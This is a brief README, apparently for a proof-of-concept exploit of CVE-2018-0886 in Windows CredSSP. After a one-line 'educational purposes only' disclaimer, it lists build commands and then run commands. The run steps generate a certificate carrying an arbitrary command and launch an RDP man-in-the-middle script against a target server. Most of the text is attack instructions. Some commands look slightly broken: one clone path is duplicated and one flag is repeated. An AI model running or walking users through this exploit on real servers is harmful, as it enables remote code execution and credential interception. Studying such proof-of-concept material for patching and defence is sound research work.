# credssp
A code demonstrating CVE-2018-0886

This is a code used for exploition this vulnerability, and it should be used for educational purposes only.

# Build

## Instructions (Linux)
If you are using Ubuntu 14 , check the file.. 


$ git clone https://github.com/preempt/rdpy.git rdpy
$ git clone https://github.com/preempt/credssp.git rdpy
$ credssp/install/install.sh 
$ python rdpy/setup.py install

# Running the exploit 

$ Export a certificate suitable for Server Authentication from any domain
$ python credssp/bin/gen_cmd.py -c ExportedCert -c exploitc.pem -k exploitk.pem CMD to generate a suitable certificate for the CommandToRun
$ python /usr/local/bin/rdpy-rdpcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer

